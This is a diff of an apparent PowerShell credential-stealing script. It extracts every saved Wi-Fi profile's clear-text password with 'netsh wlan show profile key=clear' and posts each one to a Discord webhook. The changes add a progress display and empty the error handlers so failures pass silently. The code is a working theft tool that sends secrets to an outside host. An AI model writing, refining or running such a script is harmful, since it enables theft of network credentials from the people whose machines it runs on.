@@ -39,15 +39,22 @@ $null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append
 
 try {
     # Extract Wi-Fi profiles
-    netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+    $profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'
+    $totalProfiles = $profiles.Count
+    $currentProfile = 0
+
+    $profiles | ForEach-Object {
         $wlan = $_.Matches.Value
-        
+        $currentProfile++
+
+        # Update progress for each Wi-Fi profile processed
+        Write-Progress -Activity "Extracting Wi-Fi profiles" -Status "Processing profile $currentProfile of $totalProfiles" -PercentComplete (($currentProfile / $totalProfiles) * 100)
+
         # Extract the Wi-Fi password
         try {
             $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
         } catch {
-            #Write-Host "Failed to retrieve password for $wlan"
-            $passw = "N/A" # Assign a placeholder if password retrieval fails
+            $passw = "N/A"  # Assign a placeholder if password retrieval fails
         }
 
         # Build the message body for the webhook
@@ -59,13 +66,10 @@ try {
         # Send the data to the Discord webhook
         try {
             Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
-        } catch {
-            #Write-Host "Failed to send data to Discord webhook"
-        }
+        } catch {}
     }
-} catch {
-    #Write-Host "An error occurred: $($_.Exception.Message)"
-}
+} catch {}
+
 
 ###############################################################################
 
